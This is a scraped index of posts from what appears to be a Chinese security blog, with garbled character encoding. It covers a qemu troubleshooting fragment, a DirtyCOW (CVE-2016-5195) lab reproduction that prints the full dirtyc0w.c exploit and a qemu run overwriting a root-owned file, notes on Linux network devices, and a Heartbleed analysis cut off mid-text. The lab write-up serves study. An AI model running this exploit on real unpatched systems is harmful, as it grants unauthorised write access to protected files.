virtio-net-device,netdev=net0 \\ -nographic ","date":"2022-05-26T15:51:22+08:00","image":"https://s2.loli.net/2022/05/26/RS1JrGW2t4vzD3M.jpg","permalink":"https://cerr.cc/post/%E8%AE%B0%E4%B8%80%E6%AC%A1qemu-system-arm%E4%BB%BF%E7%9C%9F%E7%9A%84%E6%8E%92%E9%94%99/","title":"è®°ä¸€æ¬¡qemu-system-armä»¿çœŸçš„æ’é”™"},{"content":"èƒŒæ™¯çŸ¥è¯† DirtyCOW https://dirtycow.ninja/ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails Copy on Write https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html https://blog.csdn.net/puliao4167/article/details/87894191 Page Cache https://en.wikipedia.org/wiki/Page_cache mmap https://www.cnblogs.com/huxiao-tee/p/4660352.html å†…æ ¸æ–‡ä»¶ç³»ç»Ÿ https://www.cnblogs.com/huxiao-tee/p/4657851.html æ¡ä»¶ç«äº‰ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/ ç¯å¢ƒå‡†å¤‡ Linux Kernel ç›´æ¥ä¸‹è½½ é€‰å–ä¸€ä¸ªæœ‰æ¼æ´çš„ç‰ˆæœ¬4.4.0ï¼Œä¸‹è½½ubuntuå¯¹åº”çš„debåŒ…ã€‚è§£å‹å¾—åˆ°./boot/vmlinuz-4.4.0-31-generic\n1 2 3 wget http://security.ubuntu.com/ubuntu/pool/main/l/linux/linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb ar xv linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb tar jxvf data.tar.bz2 ç¼ºç‚¹æ˜¯ç”±æ­¤å¾—åˆ°çš„bootable kernelä¸­ä¸åŒ…å«è°ƒè¯•ä¿¡æ¯ã€‚\nè‡ªè¡Œç¼–è¯‘ è·å–Linux Kernelæºç ä»“åº“å¹¶åˆ‡æ¢åˆ°ä¸€ä¸ªæœ‰æ¼æ´çš„ç‰ˆæœ¬4.4ï¼š\n1 2 3 git clone https://mirrors.tuna.tsinghua.edu.cn/git/linux.git cd linux git checkout v4.4 è½½å…¥x86_64çš„é»˜è®¤é…ç½®ï¼š\n1 make x86_64_defconfig ä½¿ç”¨Linuxæä¾›çš„è„šæœ¬ä¸€é”®å¯ç”¨DEBUG_KERNELã€DEBUG_INFOã€KGDBã€GDB_SCRIPTSï¼Œå…³é—­RANDOMIZE_BASEï¼ˆkaslrï¼‰\n1 ./scripts/config --file .config -e DEBUG_KERNEL -e DEBUG_INFO -e GDB_SCRIPTS -e KGDB -d RANDOMIZE_BASE ç”±äºæ˜¯æ—§ç‰ˆkernelï¼Œéœ€åœ¨è€ç¯å¢ƒä¸­ç¼–è¯‘ã€‚é‡‡ç”¨dockeråˆ›å»ºubuntu16.04çš„ç¼–è¯‘ç¯å¢ƒï¼š\n1 sudo docker run -it --rm -v /home/zkv/Laboratory/dirtycow/linux:/linux ubuntu:16.04 /bin/bash äºè¯¥containerä¸­å‡†å¤‡ç¼–è¯‘ç¯å¢ƒå¹¶ç¼–è¯‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 apt update; apt install -y apt-transport-https cat \u0026gt; /etc/apt/sources.list \u0026lt;\u0026lt; EOF deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse EOF apt update; apt upgrade -y apt install gcc make bc cd /linux make -j`nproc` å³å¾—åˆ°bootable kernelã€‚\nPoC ä»https://github.com/dirtycow/dirtycow.github.io/wiki/PoCsé€‰å–dirtyc0w.cï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void *map; int f; struct stat st; char *name; void *madviseThread(void *arg) { char *str; str=(char*)arg; int i,c=0; for(i=0;i\u0026lt;100000000;i++) { /* You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661 \u0026gt; This is achieved by racing the madvise(MADV_DONTNEED) system call \u0026gt; while having the page of the executable mmapped in memory. */ c+=madvise(map,100,MADV_DONTNEED); } printf(\u0026#34;madvise %d\\n\\n\u0026#34;,c); } void *procselfmemThread(void *arg) { char *str; str=(char*)arg; /* You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16 \u0026gt; The in the wild exploit we are aware of doesn\u0026#39;t work on Red Hat \u0026gt; Enterprise Linux 5 and 6 out of the box because on one side of \u0026gt; the race it writes to /proc/self/mem, but /proc/self/mem is not \u0026gt; writable on Red Hat Enterprise Linux 5 and 6. */ int f=open(\u0026#34;/proc/self/mem\u0026#34;,O_RDWR); int i,c=0; for(i=0;i\u0026lt;100000000;i++) { /* You have to reset the file pointer to the memory position. */ lseek(f,(uintptr_t) map,SEEK_SET); c+=write(f,str,strlen(str)); } printf(\u0026#34;procselfmem %d\\n\\n\u0026#34;, c); } int main(int argc,char *argv[]) { /* You have to pass two arguments. File and Contents. */ if (argc\u0026lt;3) { (void)fprintf(stderr, \u0026#34;%s\\n\u0026#34;, \u0026#34;usage: dirtyc0w target_file new_content\u0026#34;); return 1; } pthread_t pth1,pth2; /* You have to open the file in read only mode. */ f=open(argv[1],O_RDONLY); fstat(f,\u0026amp;st); name=argv[1]; /* You have to use MAP_PRIVATE for copy-on-write mapping. \u0026gt; Create a private copy-on-write mapping. Updates to the \u0026gt; mapping are not visible to other processes mapping the same \u0026gt; file, and are not carried through to the underlying file. It \u0026gt; is unspecified whether changes made to the file after the \u0026gt; mmap() call are visible in the mapped region. */ /* You have to open with PROT_READ. */ map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); printf(\u0026#34;mmap %zx\\n\\n\u0026#34;,(uintptr_t) map); /* You have to do it on two threads. */ pthread_create(\u0026amp;pth1,NULL,madviseThread,argv[1]); pthread_create(\u0026amp;pth2,NULL,procselfmemThread,argv[2]); /* You have to wait for the threads to finish. */ pthread_join(pth1,NULL); pthread_join(pth2,NULL); return 0; } ç¼–è¯‘PoCï¼š\n1 gcc -static -pthread dirtyc0w.c -o dirtyc0w rootfs è¿™é‡Œé‡‡ç”¨busyboxæ‰‹åŠ¨æ„å»ºã€‚å…‹éš†busyboxæºç ä»“åº“ï¼Œè¿›è¡Œmenuconfigé…ç½®ï¼š\n1 2 3 git clone https://git.busybox.net/busybox/ cd busybox make menuconfig Setttings é€‰ä¸­ Build static binary (no shared libs)ï¼Œè¿›è¡Œæˆé™æ€é“¾æ¥æ„å»ºã€‚\næ­¤åä½¿ç”¨make installï¼Œç”Ÿæˆ_installç›®å½•ï¼Œå†…å«å¯è¢«å½“ä½œæ ¹æ–‡ä»¶æ ‘ä½¿ç”¨çš„å®‰è£…æ–‡ä»¶ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®šåˆ¶ç¨åçš„rootfsã€‚å…ˆæ¥åˆ°_installåˆ›å»ºå¿…è¦çš„ç›®å½•å’Œæ–‡ä»¶ï¼š\n1 2 3 4 5 6 cd _install mkdir -p proc sys dev etc/init.d mkdir home root echo \u0026#34;root::0:0:root:/root:/bin/sh\u0026#34; \u0026gt; etc/passwd # æ­¤å¤„å°†root:x:0:0:root:/root:/bin/shä¸­çš„xåˆ é™¤å³å¯æ— å¯†ç ç™»é™†root echo \u0026#34;root:x:0:\u0026#34; \u0026gt; etc/group ç¼–å†™initè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 cat \u0026gt; ./init \u0026lt;\u0026lt; EOF #!/bin/sh mkdir /tmp mount -t proc none /proc mount -t sysfs none /sys mount -t devtmpfs none /dev mount -t debugfs none /sys/kernel/debug mount -t tmpfs none /tmp setsid /bin/cttyhack setuidgid 1000 /bin/sh EOF chmod +x ./init ç”±äºç±»ä¼¼tarã€cpioçš„å½’æ¡£ç¨‹åºä¼šå°†æ–‡ä»¶çš„inodeä¸€åŒæ‰“åŒ…ï¼Œæ•…hostæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶æ‰€å±ã€æƒé™ç­‰ä¿¡æ¯ä¹Ÿä¼šå‘ˆç°åœ¨qemu guestä¸­ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€å…ˆä¸ºbusyboxè¿›è¡Œå¿…è¦çš„æƒé™è°ƒæ•´ï¼š\n1 2 sudo chown root:root busybox/_install/bin/busybox sudo chmod u+s busybox/_install/bin/busybox å°†PoCåŠ å…¥åï¼Œæ‰“åŒ…cpioæ ¼å¼çš„initramfsï¼š\n1 2 3 4 5 cp dirtyc0w busybox/_install/bin cd busybox/_install find . | cpio -o --format=newc \u0026gt; ../../rootfs.img # è§£åŒ…å‘½ä»¤ # cpio -idmv \u0026lt; rootfs.img rootfså³å‡†å¤‡å®Œæ¯•ã€‚\næ¼æ´å¤ç° ä¸Šä¸€æ­¥å·²ç»å¾—åˆ°äº†ï¼š\nå¸¦è°ƒè¯•ä¿¡æ¯çš„Linux Kernelï¼šbzImage åŒ…å«äº†PoCçš„æ–‡ä»¶ç³»ç»Ÿinitramfsé•œåƒï¼šrootfs.img æˆ‘ä»¬ä½¿ç”¨qemuå°†å…¶å¯åŠ¨ï¼š\n1 2 3 4 5 qemu-system-x86_64 \\ -kernel bzImage \\ -initrd rootfs.img \\ -append \u0026#34;console=ttyS0\u0026#34; \\ -nographic è¿›å…¥qemu gueståï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ~ $ id uid=1000 gid=1000 groups=1000 ~ $ ls -l /bin/dirtyc0w -rwxrwxr-x 1 1000 1000 1023952 Aug 18 08:00 /bin/dirtyc0w ~ $ su / # echo nothing \u0026gt; foo / # chmod 0404 foo / # ls -lah foo -r-----r-- 1 root root 16 Aug 18 08:48 foo / # ^D ~ $ cat foo nothing ~ $ dirtyc0w foo hacked!!! mmap 7fd5597c8000 ^C ~ $ cat foo hacked!!! è‡³æ­¤æ¼æ´æˆåŠŸå¤ç°ï¼ğŸ¥³\næ¼æ´åˆ†æ Waiting\nhttps://xz.aliyun.com/t/7561\n","date":"2022-05-24T17:43:25+08:00","image":"https://s2.loli.net/2022/05/24/JFAS5mGpYn9utWi.jpg","permalink":"https://cerr.cc/post/cve-2016-5195-linux-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2016-5195 Linux DirtyCOWæ¼æ´åˆ†æ"},{"content":"ipä¸ifconfigå‘½ä»¤è¾“å‡º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ~$ ip a eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:02:e4:a7 brd ff:ff:ff:ff:ff:ff inet 192.168.188.129/24 brd 192.168.188.255 scope global dynamic noprefixroute eth0 valid_lft 1126sec preferred_lft 1126sec inet6 fe80::20c:29ff:fe02:e4a7/64 scope link noprefixroute valid_lft forever preferred_lft forever ~$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.188.129 netmask 255.255.255.0 broadcast 192.168.188.255 inet6 fe80::20c:29ff:fe02:e4a7 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:0c:29:02:e4:a7 txqueuelen 1000 (Ethernet) RX packets 959 bytes 62153 (60.6 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 66 bytes 7598 (7.4 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ç½‘å¡çš„å·¥ä½œæ¨¡å¼ å¹¿æ’­æ¨¡å¼ï¼ˆBroad Cast Modelï¼‰ï¼šå®ƒçš„ç‰©ç†åœ°å€ï¼ˆMACï¼‰åœ°å€æ˜¯ 0xffffff çš„å¸§ä¸ºå¹¿æ’­å¸§ï¼Œå·¥ä½œåœ¨å¹¿æ’­æ¨¡å¼çš„ç½‘å¡æ¥æ”¶å¹¿æ’­å¸§ï¼› å¤šæ’­ä¼ é€ï¼ˆMultiCast Modelï¼‰ï¼šå¤šæ’­ä¼ é€åœ°å€ä½œä¸ºç›®çš„ç‰©ç†åœ°å€çš„å¸§å¯ä»¥è¢«ç»„å†…çš„å…¶å®ƒä¸»æœºåŒæ—¶æ¥æ”¶ï¼Œè€Œç»„å¤–ä¸»æœºå´æ¥æ”¶ä¸åˆ°ã€‚ä½†æ˜¯ï¼Œå¦‚æœå°†ç½‘å¡è®¾ç½®ä¸ºå¤šæ’­ä¼ é€æ¨¡å¼ï¼Œå®ƒå¯ä»¥æ¥æ”¶æ‰€æœ‰çš„å¤šæ’­ä¼ é€å¸§ï¼Œè€Œä¸è®ºå®ƒæ˜¯ä¸æ˜¯ç»„å†…æˆå‘˜ï¼› ç›´æ¥æ¨¡å¼ï¼ˆDirect Modelï¼‰ï¼šå·¥ä½œåœ¨ç›´æ¥æ¨¡å¼ä¸‹çš„ç½‘å¡åªæ¥æ”¶ç›®åœ°å€æ˜¯è‡ªå·± Macåœ°å€çš„å¸§ï¼› æ··æ‚æ¨¡å¼ï¼ˆPromiscuous Modelï¼‰ï¼šå·¥ä½œåœ¨æ··æ‚æ¨¡å¼ä¸‹çš„ç½‘å¡æ¥æ”¶æ‰€æœ‰çš„æµè¿‡ç½‘å¡çš„å¸§ï¼Œä¿¡åŒ…æ•è·ç¨‹åºå°±æ˜¯åœ¨è¿™ç§æ¨¡å¼ä¸‹è¿è¡Œçš„ã€‚ ç½‘å¡çš„ç¼ºçœå·¥ä½œæ¨¡å¼åŒ…å«å¹¿æ’­æ¨¡å¼å’Œç›´æ¥æ¨¡å¼ï¼Œå³å®ƒåªæ¥æ”¶å¹¿æ’­å¸§å’Œå‘ç»™è‡ªå·±çš„å¸§ã€‚å¦‚æœé‡‡ç”¨æ··æ‚æ¨¡å¼ï¼Œä¸€ä¸ªç«™ç‚¹çš„ç½‘å¡å°†æ¥å—åŒä¸€ç½‘ç»œå†…æ‰€æœ‰ç«™ç‚¹æ‰€å‘é€çš„æ•°æ®åŒ…è¿™æ ·å°±å¯ä»¥åˆ°è¾¾å¯¹äºç½‘ç»œä¿¡æ¯ç›‘è§†æ•è·çš„ç›®çš„ã€‚\nLinuxä¸‹çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ é€šè¿‡ip link addå¯ä»¥åˆ›å»ºå¤šç§ç±»å‹çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œåœ¨man ip linkä¸­å¯ä»¥å¾—çŸ¥æœ‰ä»¥ä¸‹ç±»å‹çš„device:\nbridge - Ethernet Bridge device bond - Bonding device dummy - Dummy network interface hsr - High-availability Seamless Redundancy device ifb - Intermediate Functional Block device ipoib - IP over Infiniband device macvlan - Virtual interface base on link layer address (MAC) macvtap - Virtual interface based on link layer address (MAC) and TAP. vcan - Virtual Controller Area Network interface vxcan - Virtual Controller Area Network tunnel interface veth - Virtual ethernet interface vlan - 802.1q tagged virtual LAN interface vxlan - Virtual eXtended LAN ip6tnl - Virtual tunnel interface IPv4|IPv6 over IPv6 ipip - Virtual tunnel interface IPv4 over IPv4 sit - Virtual tunnel interface IPv6 over IPv4 gre - Virtual tunnel interface GRE over IPv4 gretap - Virtual L2 tunnel interface GRE over IPv4 erspan - Encapsulated Remote SPAN over GRE and IPv4 ip6gre - Virtual tunnel interface GRE over IPv6 ip6gretap - Virtual L2 tunnel interface GRE over IPv6 ip6erspan - Encapsulated Remote SPAN over GRE and IPv6 vti - Virtual tunnel interface nlmon - Netlink monitoring device ipvlan - Interface for L3 (IPv6/IPv4) based VLANs ipvtap - Interface for L3 (IPv6/IPv4) based VLANs and TAP lowpan - Interface for 6LoWPAN (IPv6) over IEEE 802.15.4 / Bluetooth geneve - GEneric NEtwork Virtualization Encapsulation bareudp - Bare UDP L3 encapsulation support amt - Automatic Multicast Tunneling (AMT) macsec - Interface for IEEE 802.1AE MAC Security (MACsec) vrf - Interface for L3 VRF domains netdevsim - Interface for netdev API tests rmnet - Qualcomm rmnet device xfrm - Virtual xfrm interface TUN/TAP TUNæ˜¯Linuxç³»ç»Ÿé‡Œçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå®ƒçš„åŸç†å’Œä½¿ç”¨åœ¨Kernel Docå’ŒWikiåšäº†æ¯”è¾ƒæ¸…æ¥šçš„è¯´æ˜ã€‚\nTUNè®¾å¤‡æ¨¡æ‹Ÿç½‘ç»œå±‚è®¾å¤‡(network layer)ï¼Œå¤„ç†ä¸‰å±‚æŠ¥æ–‡ï¼ŒIPæŠ¥æ–‡ç­‰ï¼Œç”¨äºå°†æŠ¥æ–‡æ³¨å…¥åˆ°ç½‘ç»œåè®®æ ˆã€‚\nåº”ç”¨ç¨‹åº(app)å¯ä»¥ä»ç‰©ç†ç½‘å¡ä¸Šè¯»å†™æŠ¥æ–‡ï¼Œç»è¿‡å¤„ç†åé€šè¿‡TUNå›é€ï¼Œæˆ–è€…ä»TUNè¯»å–æŠ¥æ–‡å¤„ç†åç»ç‰©ç†ç½‘å¡é€å‡ºã€‚\nTAPæ˜¯Linuxç³»ç»Ÿé‡Œçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå®ƒçš„åŸç†å’Œä½¿ç”¨åœ¨Kernel Docå’ŒWikiåšäº†æ¯”è¾ƒæ¸…æ¥šçš„è¯´æ˜ã€‚\nä¸åŒäºTUNçš„æ˜¯ï¼ŒTAPè®¾å¤‡æ¨¡æ‹Ÿé“¾è·¯å±‚è®¾å¤‡(link layer)ï¼Œå¤„ç†äºŒå±‚æŠ¥æ–‡ï¼Œä»¥å¤ªç½‘å¸§ç­‰ã€‚\nTAPè®¾å¤‡ä¸TUNè®¾å¤‡çš„åŒºåˆ«åœ¨äº:\nTAPè™šæ‹Ÿçš„æ˜¯ä¸€ä¸ªäºŒå±‚è®¾å¤‡ï¼Œå…·æœ‰MACåœ°å€ï¼Œæ¥æ”¶ã€å‘é€çš„æ˜¯äºŒå±‚åŒ…ã€‚ TUNè™šæ‹Ÿçš„æ˜¯ä¸€ä¸ªä¸‰å±‚è®¾å¤‡ï¼Œæ²¡æœ‰MACåœ°å€ï¼Œæ¥æ”¶ã€å‘é€çš„æ˜¯ä¸‰å±‚åŒ…ã€‚ æœ€å°çš„è™šæ‹Ÿç½‘å¡ å‚è§ï¼š\nhttps://zhou-yuxin.github.io/articles/2017/%E7%AC%AC%E4%B8%80%E4%B8%AALinux%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E2%80%94%E2%80%94%E6%9C%80%E7%AE%80%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1virnet/index.html\n","date":"2022-05-23T23:21:12+08:00","image":"https://s2.loli.net/2022/05/23/nEj1icSvZsA479q.jpg","permalink":"https://cerr.cc/post/%E5%85%B3%E4%BA%8Elinux%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/","title":"å…³äºLinuxä¸‹çš„ç½‘å¡ä¸ç½‘ç»œè®¾å¤‡"},{"content":" æ¼æ´ç¼–å·ï¼šCVE-2014-0160\næ¼æ´ç±»å‹ï¼šå†…å­˜è¶Šç•Œè®¿é—®\næ¼æ´å±å®³ï¼šä¿¡æ¯æ³„éœ²\nå½±å“èŒƒå›´ï¼šOpenSSL1.0.1ã€OpenSSL 1.0.1a~ OpenSSL 1.0.1fã€OpenSSL 1.0.2-beta\næ¼æ´æè¿°ï¼šOpenSSL åœ¨å®ç° TLSï¼ˆä¼ è¾“å±‚å®‰å…¨åè®®ï¼‰å’Œ DTLSï¼ˆæ•°æ®æŠ¥å®‰å…¨ä¼ è¾“åè®®ï¼‰çš„å¿ƒè·³åŒ…å¤„ç†é€»è¾‘æ—¶å­˜åœ¨é—®é¢˜ã€‚OpenSSL çš„ Heartbleed æ¨¡å—åœ¨å¤„ç†å¿ƒè·³åŒ…æ—¶æ²¡æœ‰æ£€æŸ¥å¿ƒè·³åŒ…ä¸­çš„é•¿åº¦å­—æ®µæ˜¯å¦ä¸åç»­çš„æ•°æ®å­—æ®µä¸€è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´æ„é€ å¼‚å¸¸æ•°æ®åŒ…ï¼Œå¯è·å–æœåŠ¡å™¨å†…å­˜ä¸­å¤šè¾¾ 64KB çš„æ•°æ®ã€‚è¿™äº›æ•°æ®å¯èƒ½ä¼šåŒ…å«è¯ä¹¦ç§é’¥ã€ç”¨æˆ·è´¦å·ã€å¯†ç ã€é‚®ä»¶å†…å®¹ç­‰æ•æ„Ÿä¿¡æ¯ã€‚\nèƒŒæ™¯çŸ¥è¯† ç®€ä»‹ ä¼ è¾“å±‚å®‰å…¨æ€§åè®®SSL\nSSL å…¨ç§° Secure Sockets Layerï¼ˆå®‰å…¨å¥—æ¥å­—å±‚åè®®ï¼‰ï¼Œè¦æ±‚å»ºç«‹åœ¨å¯é çš„ä¼ è¾“å±‚åè®®ï¼ˆTCPï¼‰ä¹‹ä¸Šï¼Œä¸»è¦æä¾›æœºå¯†æ€§ã€è®¤è¯æ€§åŠæ•°æ®å®Œæ•´æ€§æœåŠ¡ã€‚SSL æœ€åˆï¼ˆSSL 1.0ã€SSL2.0ã€SSL 3.0 ç‰ˆæœ¬ï¼‰ç”±ç½‘æ™¯å…¬å¸è®¾è®¡å’Œç»´æŠ¤ï¼Œä» 3.1 ç‰ˆæœ¬å¼€å§‹ï¼ŒSSL åè®®ç”±å› ç‰¹ç½‘å·¥ç¨‹ä»»åŠ¡å°ç»„ï¼ˆIETFï¼‰æ­£å¼æ¥ç®¡ï¼Œå¹¶æ›´åä¸º TLSï¼ˆä¼ è¾“å±‚å®‰å…¨åè®®ï¼ŒTransport Layer Securityï¼‰ï¼Œå‘å±•è‡³ä»Šå·²æœ‰ TLS 1.0ã€TLS1.1ã€TLS1.2 ä¸‰ä¸ªç‰ˆæœ¬ã€‚\nSSL/TLS åè®®èƒ½å¤Ÿæä¾›çš„å®‰å…¨æœåŠ¡ä¸»è¦åŒ…æ‹¬ï¼š\nè®¤è¯æ€§â€”â€”ä½¿ç”¨æ•°å­—è¯ä¹¦è®¤è¯æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯èº«ä»½ï¼Œé˜²æ­¢èº«ä»½ä¼ªé€ ï¼› æœºå¯†æ€§â€”â€”ä½¿ç”¨åŠ å¯†ç®—æ³•é˜²æ­¢ç¬¬ä¸‰æ–¹çªƒå¬ï¼› å®Œæ•´æ€§â€”â€”ä½¿ç”¨æ¶ˆæ¯è®¤è¯ç ï¼ˆMACï¼‰ä¿éšœæ•°æ®å®Œæ•´æ€§ï¼Œé˜²æ­¢æ¶ˆæ¯è¢«ç¯¡æ”¹ï¼› é‡æ”¾ä¿æŠ¤â€”â€”é€šè¿‡ä½¿ç”¨éšå¼åºåˆ—å·é˜²æ­¢é‡æ”¾æ”»å‡»ï¼› SSLæ¡æ‰‹è¿‡ç¨‹ å®¢æˆ·ç«¯è·å–æœåŠ¡å™¨çš„æ•°å­—è¯ä¹¦åï¼Œåå•†åç»­æ•°æ®ä¼ è¾“æ‰€ä½¿ç”¨çš„å¯¹ç§°åŠ å¯†å¯†é’¥ã€‚\nSSL Heartbeat Heartbleed was introduced by the Heartbeat Extension in the OpenSSL version 1.0.11 . This extension enables a low-cost, keepalive mechanism for peers to know that theyâ€™re still connected and all is well at the TLS layer. Standard implementations of TLS do not require the extension as they can rely on TCP for equivalent session management. Version 1.0.1 of OpenSSL added support for the Heartbeat functionality and enabled it by default.\næ–‡æ¡£ï¼šTransport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension\nSSL åè®®å®Œæˆæ¡æ‰‹è¿‡ç¨‹åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é—´ä¾¿å»ºç«‹å®‰å…¨å¯é çš„é€šä¿¡ã€‚SSL å®‰å…¨åè®®å·¥ä½œåœ¨ä¼ è¾“å±‚çš„ TCP åè®®ä¹‹ä¸Šï¼Œæ‰€ä»¥æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éœ€è¦ä¿æŒæŒç»­è¿æ¥çš„çŠ¶æ€ã€‚ç”±äºæœåŠ¡å™¨çš„èµ„æºæœ‰é™ï¼Œå½“è¿æ¥çš„å®¢æˆ·ç«¯æ•°é‡è¾ƒå¤§æ—¶ï¼ŒæœåŠ¡å™¨è¦ç»´æŒè¿™äº›è¿æ¥å°†ä¼šæ¶ˆè€—å¾ˆå¤šèµ„æºï¼Œå› æ­¤éœ€è¦åŠæ—¶æ–­å¼€å®Œæˆé€šä¿¡çš„å®¢æˆ·ç«¯ä»¥å‡å°‘æœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›ã€‚æœåŠ¡å™¨é€šè¿‡ SSL çš„å¿ƒè·³æœºåˆ¶å¯åˆ¤æ–­å®¢æˆ·ç«¯æ˜¯å¦å·²å®Œæˆé€šä¿¡ã€‚\nSSL åè®®ä¸­çš„å¿ƒè·³æœºåˆ¶å·¥ä½œäº SSL è®°å½•åè®®ä¹‹ä¸Šï¼Œå¿ƒè·³æœºåˆ¶ä¸­åŒ…å«ä¸¤ç§ç±»å‹çš„æ¶ˆæ¯ï¼šå¿ƒè·³è¯·æ±‚æ¶ˆæ¯ï¼ˆHeartbeatRequest Messageï¼‰å’Œå¿ƒè·³å“åº”æ¶ˆæ¯ï¼ˆHeartbeatResponse Messageï¼‰ï¼Œè¿™ä¸¤ç§æ¶ˆæ¯å…·æœ‰ç›¸åŒçš„åŒ…ç»“æ„ã€‚å½“æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å®Œæˆ SSL åè®®çš„æ¡æ‰‹é˜¶æ®µåï¼Œå¦‚æœå®¢æˆ·ç«¯ä¸€æ®µæ—¶é—´æ²¡æœ‰ä¸æœåŠ¡å™¨è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå®¢æˆ·ç«¯éœ€è¦å‘¨æœŸæ€§åœ°å‘æœåŠ¡å™¨å‘é€å¿ƒè·³è¯·æ±‚æ¶ˆæ¯ã€‚æœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„å¿ƒè·³è¯·æ±‚æ¶ˆæ¯ï¼Œåˆ™è®¤ä¸ºå®¢æˆ·ç«¯è¿˜æ²¡æœ‰å®Œæˆé€šä¿¡ï¼Œç»§ç»­ç»´æŒå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„è¿æ¥ï¼Œå¹¶å‘å®¢æˆ·ç«¯å‘é€å¿ƒè·³å“åº”æ¶ˆæ¯ã€‚\né€šä¿¡åŒæ–¹åœ¨å»ºç«‹ SSL è¿æ¥æ—¶å¯åå•†æ˜¯å¦æ”¯æŒå¿ƒè·³æœºåˆ¶ã€‚åœ¨ SSL ç¬¬ä¸€æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­é€šè¿‡ Client Hello æ¶ˆæ¯å’Œ Server Hello æ¶ˆæ¯çš„ Heartbeat Hello æ‰©å±•å‘ŠçŸ¥å¯¹æ–¹æ˜¯å¦æ”¯æŒå¿ƒè·³æœºåˆ¶ã€‚Heartbeat Hello æ‰©å±•çš„æ ¼å¼å¦‚ä¸‹ã€‚å½“æ”¯æŒå¿ƒè·³æœºåˆ¶æ—¶è®¾ç½® HeartbeatMode ä¸º peer_allowed_to_sendï¼Œå¯æ¥æ”¶å¿ƒè·³è¯·æ±‚æ¶ˆæ¯å¹¶èƒ½è¿”å›å“åº”åŒ…ï¼›å½“ä¸æ”¯æŒå¿ƒè·³æœºåˆ¶æ—¶è®¾ç½® HeartbeatMode ä¸º peer_not_allowed_to_sendï¼Œè‹¥å¯¹ç«¯å‘é€å¿ƒè·³è¯·æ±‚æ¶ˆæ¯ï¼Œå°†ä¼šä¸¢å¼ƒè¯¥æ¶ˆæ¯å¹¶è¿”å› unexpected_message è­¦å‘Šæ¶ˆæ¯ã€‚\n1 2 3 4 5 6 7 8 enum { peer_allowed_to_send(1), peer_not_allowed_to_send(2), } HeartbeatMode; struct { HeartbeatMode mode; } HeartbeatExtension; å¿ƒè·³åŒ…çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå‰åŠéƒ¨åˆ†ä¸º SSL è®°å½•å¤´ï¼ŒContent Type ä¸ºæ¶ˆæ¯ç±»å‹ï¼ˆ0x18 è¡¨ç¤ºå¿ƒè·³åŒ…æ¶ˆæ¯ï¼‰ï¼ŒTLS Version ä¸º SSL ç‰ˆæœ¬ä¿¡æ¯ï¼ŒRecord length 